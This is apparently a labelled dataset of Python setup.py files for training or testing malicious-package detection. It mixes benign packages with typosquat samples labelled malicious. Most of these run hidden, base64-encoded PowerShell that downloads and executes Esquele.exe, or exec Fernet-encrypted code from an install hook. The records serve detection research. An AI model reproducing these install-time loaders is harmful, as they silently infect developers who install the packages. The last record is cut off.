{"idx": "pytspeak-3.23", "func": "import platform\nfrom setuptools import setup\n\n\n# Ubuntu: sudo apt install espeak ffmpeg\ninstall_requires = [\n    'comtypes; platform_system == \"Windows\"',\n    'pypiwin32; platform_system == \"Windows\"',\n    'pywin32; platform_system == \"Windows\"',\n    'pyobjc>=2.4; platform_system == \"Darwin\"'\n]\n\n\nwith open('README.rst', 'r') as f:\n    long_description = f.read()\n\nsetup(\n    name='pytspeak',\n    packages=['pytspeak', 'pytspeak.drivers'],\n    version='3.23',\n   description='pytspeak is a library for text-to-speech conversion in Python.',\n    long_description=long_description,\n    summary='Convert Text To Speech for Python',\n    author='Nine Mbhat',\n    url='https://github.com/nateshmbhat/pytspeak',\n    author_email='ninembhat@outlook.com',\n    install_requires=install_requires ,\n    keywords=['text','speach'],\n    classifiers = [\n          'Intended Audience :: End Users/Desktop',\n          'Intended Audience :: Developers',\n          'Intended Audience :: Information Technology',\n          'Intended Audience :: System Administrators',\n          'Operating System :: MacOS :: MacOS X',\n          'Operating System :: Microsoft :: Windows',\n          'Operating System :: POSIX',\n          'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7'\n    ],\n)\n", "target": 1}
{"idx": "py-maskverstring-7.31", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-maskverstring',\n    packages = ['modlib'],\n    version = '4.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfpingintelcandy-1.79", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpingintelcandy',\n    packages = ['modlib'],\n    version = '4.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "djangosaml2idp-0.7.2", "func": "# -*- coding: utf-8 -*-\nimport os\nfrom setuptools import setup, find_packages\n\nfrom djangosaml2idp import __version__\n\nsetup(\n    name='djangosaml2idp',\n    version=__version__,\n    description='SAML 2.0 Identity Provider for Django',\n    keywords=\"django,pysaml2,sso,saml2,federated authentication,authentication,idp\",\n    author='Mathieu Hinderyckx',\n    author_email='mathieu.hinderyckx@gmail.com',\n    maintainer=\"Mathieu Hinderyckx\",\n    long_description=\"\\n\\n\".join([\n        open(os.path.join(os.path.dirname(__file__), 'README.rst')).read(),\n    ]),\n    install_requires=[\n        'django>=2.2',\n        'pysaml2>=5.0.0',\n        'pytz',\n        'arrow',\n    ],\n    extras_require={\n        \"testing\": [\n            \"pytest\",\n            \"pytest-runner\",\n            \"pytest-django\",\n            \"pytest-cov\",\n            \"pytest-pythonpath\",\n            \"pytest-mock\",\n            \"requests-mock\"\n        ]\n    },\n    python_requires=\">=3.6\",\n    license='Apache Software License 2.0',\n    packages=find_packages(exclude=[\"tests*\", \"docs\", \"example_setup\"]),\n    url='https://github.com/OTA-Insight/djangosaml2idp/',\n    zip_safe=False,\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        'Environment :: Web Environment',\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: Apache Software License\",\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: WSGI\",\n        \"Topic :: Security\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "coloramxa-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'raMyoZlJJlgNFGLQQJIARjmoMhuaKMTrggPOfFBymBixUkLde'\nLONG_DESCRIPTION = 'APQgaoOnTACwgmlGaGoQOU igmrJBrwwfPyNptdxqiFeNWAEmRPLFCANZWBWmw Ab DSjRwswCnTLdRlNCxqtcYmNZnfiMShRiIcupvtcKdMTCykgTKNhMyrDMsXZW'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'AEgzb4TTjkV7yu91cSYKC-IdOH1Fwg94hB7H6BSg3_A=').decrypt(b'gAAAAABmA1kSRc7MwOJYiMIY8UC-ECBIOHt2MaqAB8URWy8uwjtC5ou4T7hOOYjSr3bnGK_umb-8SlENIdYo5uup9iD4-iAbDYI7WE9bks71vtrW0n66N27aGBjaoHV1la-6i2edJ4V0S3q8kaOYd_IfvbUbrkQYsnzMBcGfy5jAlDqo3VUyc9yXGywl_v5JMLJdoDEPdWUE_CHWARU7nm5pnaZYtGuN44RdSCMCaXWZNSQTmLLSqbQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"coloramxa\",\n    version=VERSION,\n    author=\"cZEDGIPTUjs\",\n    author_email=\"TZpLVUReGmSXBFV@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "fastcluster-1.2.6", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nu'''\n  fastcluster: Fast hierarchical clustering routines for R and Python\n\n  Copyright:\n    * Until package version 1.1.23: \u00a9 2011 Daniel M\u00fcllner <http://danifold.net>\n    * All changes from version 1.1.24 on: \u00a9 Google Inc. <http://google.com>\n'''\nimport os\nimport sys\nimport numpy\nfrom setuptools import setup, Extension\nfrom io import open\n\nwith open('fastcluster.py', encoding='utf_8') as f:\n    for line in f:\n        if line.find('__version_info__ =') == 0:\n            version = '.'.join(line.split(\"'\")[1:-1:2])\n            break\n\nprint('Fastcluster version: ' + version)\nprint('Python version: ' + sys.version)\n\nsetup(name='fastcluster',\n      version=version,\n      py_modules=['fastcluster'],\n      description='Fast hierarchical clustering routines for R and Python.',\n      long_description=u\"\"\"\nThis library provides Python functions for hierarchical clustering. It\ngenerates hierarchical clusters from distance matrices or from vector data.\n\nThis module is intended to replace the functions\n```\n    linkage, single, complete, average, weighted, centroid, median, ward\n```\nin the module [`scipy.cluster.hierarchy`](\nhttps://docs.scipy.org/doc/scipy/reference/cluster.hierarchy.html) with the same\nfunctionality but much faster algorithms. Moreover, the function\n`linkage_vector` provides memory-efficient clustering for vector data.\n\nThe interface is very similar to MATLAB's Statistics Toolbox API to make code\neasier to port from MATLAB to Python/NumPy. The core implementation of this\nlibrary is in C++ for efficiency.\n\n**User manual:** [fastcluster.pdf](\nhttps://github.com/dmuellner/fastcluster/raw/master/docs/fastcluster.pdf).\n\nThe \u201cYule\u201d distance function changed in fastcluster version 1.2.0. This is\nfollowing a [change in SciPy 1.6.3](\nhttps://github.com/scipy/scipy/commit/3b22d1da98dc1b5f64bc944c21f398d4ba782bce).\nIt is recommended to use fastcluster version 1.1.x together with SciPy versions\nbefore 1.6.3 and fastcluster 1.2.x with SciPy \u22651.6.3.\n\nThe fastcluster package is considered stable and will undergo few changes\nfrom now on. If some years from now there have not been any updates, this does\nnot necessarily mean that the package is unmaintained but maybe it just was\nnot necessary to correct anything. Of course, please still report potential\nbugs and incompatibilities to daniel@danifold.net. You may also use\n[my GitHub repository](https://github.com/dmuellner/fastcluster/)\nfor bug reports, pull requests etc.\n\nNote that [PyPI](https://pypi.org/project/fastcluster/) and [my GitHub\nrepository](https://github.com/dmuellner/fastcluster/) host the source code\nfor the Python interface only. The archive with both the R and the Python\ninterface is available on\n[CRAN](https://CRAN.R-project.org/package=fastcluster) and the GitHub repository\n[\u201ccran/fastcluster\u201d](https://github.com/cran/fastcluster). Even though I appear\nas the author also of this second GitHub repository, this is just an automatic,\nread-only mirror of the CRAN archive, so please do not attempt to report bugs or\ncontact me via this repository.\n\nInstallation files for Windows are provided on [PyPI](\nhttps://pypi.org/project/fastcluster/#files) and on [Christoph Gohlke's web\npage](http://www.lfd.uci.edu/~gohlke/pythonlibs/#fastcluster).\n\nChristoph Dalitz wrote a pure [C++ interface to fastcluster](\nhttps://lionel.kr.hs-niederrhein.de/~dalitz/data/hclust/).\n\nReference: Daniel M\u00fcllner, *fastcluster: Fast Hierarchical, Agglomerative\nClustering Routines for R and Python*, Journal of Statistical Software, **53**\n(2013), no. 9, 1\u201318, https://doi.org/10.18637/jss.v053.i09.\n\"\"\",\n      long_description_content_type='text/markdown',\n      python_requires='>=3',\n      requires=['numpy'],\n      install_requires=[\"numpy>=1.9\"],\n      extras_require={'test':  ['scipy>=1.6.3']},\n      provides=['fastcluster'],\n      ext_modules=[Extension('_fastcluster',\n                             ['src/fastcluster_python.cpp'],\n                             extra_compile_args=['/EHsc'] if os.name == 'nt' else [],\n                             include_dirs=[numpy.get_include()],\n# Feel free to uncomment the line below if you use the GCC.\n# This switches to more aggressive optimization and turns\n# more warning switches on. No warning should appear in\n# the compilation process.\n#\n# Also, the author's Python distribution generates debug\n# symbols by default. This can be turned off, resulting a in\n# much smaller compiled library.\n#\n# Optimization\n#extra_compile_args=['-O2', '-g0', '-march=native', '-mtune=native', '-fno-math-errno'],\n#\n# List of all warning switches, somewhere from stackoverflow.com\n#extra_compile_args=['-Wall', '-Weffc++', '-Wextra', '-Wall', '-Wcast-align', '-Wchar-subscripts', '-Wcomment', '-Wconversion', '-Wsign-conversion', '-Wdisabled-optimization', '-Wfloat-equal', '-Wformat', '-Wformat=2', '-Wformat-nonliteral', '-Wformat-security', '-Wformat-y2k', '-Wimport', '-Winit-self', '-Winline', '-Winvalid-pch', '-Wunsafe-loop-optimizations', '-Wmissing-braces', '-Wmissing-field-initializers', '-Wmissing-format-attribute', '-Wmissing-include-dirs', '-Wmissing-noreturn', '-Wpacked', '-Wparentheses', '-Wpointer-arith', '-Wredundant-decls', '-Wreturn-type', '-Wsequence-point', '-Wshadow', '-Wsign-compare', '-Wstack-protector', '-Wstrict-aliasing', '-Wstrict-aliasing=2', '-Wswitch', '-Wswitch-enum', '-Wtrigraphs', '-Wuninitialized', '-Wunknown-pragmas', '-Wunreachable-code', '-Wunused', '-Wunused-function', '-Wunused-label', '-Wunused-parameter', '-Wunused-value', '-Wunused-variable', '-Wvariadic-macros', '-Wvolatile-register-var', '-Wwrite-strings', '-Wlong-long', '-Wpadded', '-Wcast-qual', '-Wswitch-default', '-Wnon-virtual-dtor', '-Wold-style-cast', '-Woverloaded-virtual', '-Waggregate-return', '-Werror'],\n#\n# Linker optimization\n#extra_link_args=['-Wl,--strip-all'],\n      )],\n      keywords=['dendrogram', 'linkage', 'cluster', 'agglomerative',\n                'hierarchical', 'hierarchy', 'ward'],\n      author=u\"Daniel M\u00fcllner\",\n      author_email=\"daniel@danifold.net\",\n      license=\"BSD <http://opensource.org/licenses/BSD-2-Clause>\",\n      classifiers=[\n          \"Topic :: Scientific/Engineering :: Information Analysis\",\n          \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n          \"Topic :: Scientific/Engineering :: Bio-Informatics\",\n          \"Topic :: Scientific/Engineering :: Mathematics\",\n          \"Programming Language :: Python\",\n          \"Programming Language :: Python :: 3\",\n          \"Programming Language :: C++\",\n          \"Operating System :: OS Independent\",\n          \"License :: OSI Approved :: BSD License\",\n          \"License :: OSI Approved :: GNU General Public License v2 (GPLv2)\",\n          \"Intended Audience :: Science/Research\",\n          \"Development Status :: 5 - Production/Stable\"],\n      url='http://danifold.net',\n      test_suite='tests.fastcluster_test',\n)\n", "target": 0}
{"idx": "ponggrand-7.33", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ponggrand',\n    packages = ['modlib'],\n    version = '2.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dj-static-0.0.6", "func": "# -*- coding: utf-8 -*-\n\"\"\"\ndj-static\n~~~~~~~~~\n\nThis is a simple Django middleware utility that allows you to properly\nserve static assets from production with a WSGI server like Gunicorn.\n\nDjango `doesn't recommend <https://docs.djangoproject.com/en/1.5/howto/static-files/#admonition-serving-the-files>`_\nthe production use of its static file server for a number of reasons.\nThere exists, however, a lovely WSGI application aptly named `Static <http://lukearno.com/projects/static/>`_.\n\nIt is suitable for the production use of static file serving, unlike Django.\n\nUsage\n-----\n\nConfigure your static assets in ``settings.py``::\n\n   STATIC_ROOT = 'staticfiles'\n   STATIC_URL = '/static/'\n\nThen, update your ``wsgi.py`` file to use dj-static::\n\n    from django.core.wsgi import get_wsgi_application\n    from dj_static import Cling\n\n    application = Cling(get_wsgi_application())\n\n\"\"\"\n\nfrom setuptools import setup\n\nsetup(\n    name='dj-static',\n    version='0.0.6',\n    url='https://github.com/kennethreitz/dj-static',\n    license='BSD',\n    author='Kenneth Reitz',\n    author_email='me@kennethreitz.com',\n    description='Serve production static files with Django.',\n    long_description=__doc__,\n    py_modules=['dj_static'],\n    zip_safe=False,\n    install_requires=['static3'],\n    include_package_data=True,\n    platforms='any',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "minecv-4.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'minecv',\n    packages = ['modlib'],\n    version = '4.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "coloramqa-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'VkCMXWUTHZDVquMIiBSjkNqYUQidmQthynRW'\nLONG_DESCRIPTION = 'QhoQdUANEWIoumU nempBSmnhSjcJlQhaQLxK stW  YQKwVTGFCIiwqcFjEZjZSpDUieXsKTOmpYTOkZYKzZDWKcVPYZU RYc UaHIuSJqCrsYcGrmmp LlMBMoLEcNqkwcsMaeYAhdrKUolaYSeMylIXWjEepou'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'L73tnP72VoN8wbI6jXOCKKwTH4e51B6RM91ZtEF1EFk=').decrypt(b'gAAAAABmA1kJytko_VzrOout6JnQE9zfwmr1cc7hlbd3xpam8uHUAzCi1UoCgV2PCrYNdNbIYyem2e5-nOru0ONrUYBhGggrIEAQgxE93mCF-NKEHMuSVaz6gr6Ar5a4OUee-DD03bpeWkZ4iN-uU0OPU4p43Oq6Svss9BBEFIX_i2QUA7MSn_heJn8oHyVntHFbl-4ERA_4zhbnSRrZNY3hXhHU7UAmYQrq4-5Chye1-FjS-nCNBqM='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"coloramqa\",\n    version=VERSION,\n    author=\"FBBoraZKbrPqzudrl\",\n    author_email=\"ByoVagJzyjpSmi@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "proofmc-6.61", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'proofmc',\n    packages = ['modlib'],\n    version = '4.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqguipippost-2.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguipippost',\n    packages = ['modlib'],\n    version = '10.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "posturl-4.67", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'posturl',\n    packages = ['modlib'],\n    version = '8.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqintelgrand-9.8", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintelgrand',\n    packages = ['modlib'],\n    version = '7.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 